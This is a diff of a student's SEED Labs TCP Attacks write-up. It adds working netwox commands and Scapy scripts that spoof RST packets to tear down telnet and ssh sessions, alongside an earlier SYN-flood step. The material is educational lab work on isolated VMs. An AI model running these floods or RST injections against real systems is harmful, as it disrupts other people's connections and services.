@@ -6,7 +6,7 @@ date: \today{}
 
 Instruction: https://seedsecuritylabs.org/Labs_16.04/PDF/TCP_Attacks.pdf
 
-Set up 3 VM:
+Set up 3 VMs:
 
 - **Server**: `10.0.2.4`
 - **Attacker**: `10.0.2.15`
@@ -62,7 +62,7 @@ raw        0      0 0.0.0.0:1               0.0.0.0:*               7
 raw6       0      0 :::58                   :::*                    7          
 raw6       0      0 :::58                   :::*                    7        
 ```
-No TCP connection has `ESTABLISHED` state yet.
+No TCP connection has an `ESTABLISHED` state yet.
 
 Then on the attacker machine:
 
@@ -73,8 +73,7 @@ sudo netwox 76 -i 10.0.2.4 -p 23 -s raw
 After a while, use `netstat -na` to check again:
 
 ```
-tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN     
-tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
+...   
 tcp        0      0 10.0.2.4:23             253.37.9.90:29644       SYN_RECV   
 tcp        0      0 10.0.2.4:23             248.147.173.48:53909    SYN_RECV   
 tcp        0      0 10.0.2.4:23             247.46.89.105:7502      SYN_RECV   
@@ -103,8 +102,147 @@ tcp        0      0 10.0.2.4:23             245.8.59.84:53947       SYN_RECV
 tcp        0      0 10.0.2.4:23             253.88.152.41:26808     SYN_RECV  
 ...
 ```
-There are plenty of `SYN_RECV ` state (i.e. half-open) connections targeting `10.0.2.4` from random source IP. The server seems to be overwhelmed.
+There are plenty of `SYN_RECV`-state (i.e. half-open) TCP connections targeting `10.0.2.4:23` from random source IP addresses. The server seems to be overwhelmed.
 
 Meanwhile, if you attempt to `telnet` the server machine from the user machine, it will show:
 
 ![SYN flooding attack is indeed sucessful](./flood.png)
+
+## Task 2
+
+### TCP RST attack on `telnet` connection
+
+First, on the user machine, launch a `telnet` request to the server:
+
+```
+telnet 10.0.2.4
+```
+
+A prompt asks you to give a username.**Just hold on** without typing anything.
+
+#### netwox
+
+When implementing the attack by `netwox` command, simply use such a command on the attacker machine:
+
+```
+sudo netwox 78 -i 10.0.2.4
+```
+
+Then type any letter on the user machine. As I explained in [Packet Sniffing and Spoofing Lab](../Packet-Sniffing-and-Spoofing), a `telnet` message is sent once getting a letter. After that, it keeps listening for any response from the server. Since I spoof an `RST` packet from the server to the user, which received by the listening user and informed that the connection has terminated. So when a letter is pressed, a closed connection message shows:
+
+![](./telnet_rst_1.png)
+
+#### Scapy
+
+**Note**: The login-in time window is too short. you should launch the attack as quickly as possible, or the login in prompt will be timed out after 60s. Therefore, in this task, you can finish the login-in process to observe the attack.
+
+If you want to use a Python script with `scapy` module to spoof the RST packet. First, you should sniff the last `TCP`(or `telnet`) packet  from the server to the user by Wireshark on the attack machine:
+
+For example:
+
+![](./server_to_user.png)
+
+The packet's TCP header:
+
+> Transmission Control Protocol, Src Port: 23, **Dst Port: 59498**, Seq: 199921802, **Ack: 1577076274**, Len: 1
+>     Source Port: 23
+>     Destination Port: 59498
+>     [Stream index: 0]
+>     [TCP Segment Len: 1]
+>     Sequence number: 199921802
+>     **[Next sequence number: 199921803]**
+>     Acknowledgment number: 1577076274
+>     Header Length: 32 bytes
+>     Flags: 0x018 (PSH, ACK)
+>     Window size value: 227
+>     [Calculated window size: 29056]
+>     [Window size scaling factor: 128]
+>     Checksum: 0x953c [unverified]
+>     [Checksum Status: Unverified]
+>     Urgent pointer: 0
+>     Options: (12 bytes), No-Operation (NOP), No-Operation (NOP), Timestamps
+>     [SEQ/ACK analysis]
+
+Fill out the critical fields of the spoofed packet and send it using the codes in [`rst_telent.py`](./rst_telnet.py) below:
+
+```python
+from scapy.all import *
+
+ip = IP(src="10.0.2.4", dst="10.0.2.5")
+tcp = TCP(sport=23, dport=59498, flags="R", seq=199921803, ack=1577076274)
+
+pkt = ip / tcp
+ls(pkt)
+send(pkt, verbose=0)
+```
+
+On the attacker machine, execute it with root privilege:
+```
+sudo python rst_telnet.py
+```
+Immediately, on the user machine, you can find the connection is terminated.
+
+![](./telnet_rst_2.png)
+
+### TCP RST attack on `ssh` connection
+
+The only difference between the two tasks is the port number: 23 for `telnet`, while 22 for `ssh`.
+
+Build `ssh` connection on the user machine:
+
+```
+ssh seed@10.0.2.4
+```
+> **Note**: If it is the first time you `ssh` the server on your local machine, it may ask you if the RSA public key can be added. Please type '`yes`' and then type the password of username `seed`.
+
+
+#### netwox
+
+Similar to [the one on `telnet`](#tcp-rst-attack-on-ssh-connection), Use the same commnad:
+
+```
+sudo netwox 78 -i 10.0.2.4
+```
+
+Then on the user machine after pressing anything you will get:
+
+![](./ssh_rst_1.png)
+
+#### scapy
+
+Similar to [the one on `telnet`](#tcp-rst-attack-on-ssh-connection), Capture the last `ssh` packet from the server to the user (applied with filter `ssh`) using Wireshark on the attacker machine:
+
+> Transmission Control Protocol, Src Port: 22, **Dst Port: 55494**, Seq: 565175980, **Ack: 3567039357**, Len: 52
+>     Source Port: 22
+>     Destination Port: 55494
+>     [Stream index: 0]
+>     [TCP Segment Len: 52]
+>     Sequence number: 565175980
+>     **[Next sequence number: 565176032]**
+>     Acknowledgment number: 3567039357
+>     Header Length: 32 bytes
+>     Flags: 0x018 (PSH, ACK)
+>     Window size value: 291
+>     [Calculated window size: 291]
+>     [Window size scaling factor: -1 (unknown)]
+>     Checksum: 0x3440 [unverified]
+>     [Checksum Status: Unverified]
+>     Urgent pointer: 0
+>     Options: (12 bytes), No-Operation (NOP), No-Operation (NOP), Timestamps
+>     [SEQ/ACK analysis]
+
+Although the data is encrypted, the TCP header is simply readable plain-text. Then a spoofed RST packet can be composed and sent with [`rst_ssh.py`](./rst_ssh.py):
+
+```python
+from scapy.all import *
+
+ip = IP(src="10.0.2.4", dst="10.0.2.5")
+tcp = TCP(sport=22, dport=55494, flags="R", seq=565176032, ack=3567039357)
+
+pkt = ip / tcp
+ls(pkt)
+send(pkt, verbose=0)
+```
+Turn to the user machine, the `ssh` connection is broken as expected:
+
+![](./ssh_rst_2.png)
